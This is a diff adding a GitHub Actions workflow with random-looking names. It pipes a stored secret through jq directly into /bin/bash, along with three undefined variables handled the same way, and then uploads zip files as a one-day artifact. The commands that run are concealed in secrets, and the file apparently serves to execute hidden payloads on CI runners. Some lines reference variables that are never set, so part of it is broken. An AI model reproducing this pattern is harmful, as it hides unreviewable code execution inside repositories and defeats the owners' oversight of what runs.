@@ -1,0 +1,24 @@
+name: ashleydev8093
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ashleydev8093
+        env:
+          gpvb68281: ${{ secrets.gpvb68281 }}
+        run: |
+          printf '%s' "$gpvb68281" | jq -r .ssco30 | /bin/bash
+          printf '%s' "$oyf2634" | jq -r .zi5328 | /bin/bash
+          printf '%s' "$w71" | jq -r .wzbna607 | /bin/bash
+          printf '%s' "$sm4760" | jq -r .nm23 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: XLkSyUsq
+          path: "*.zip"
+          retention-days: 1
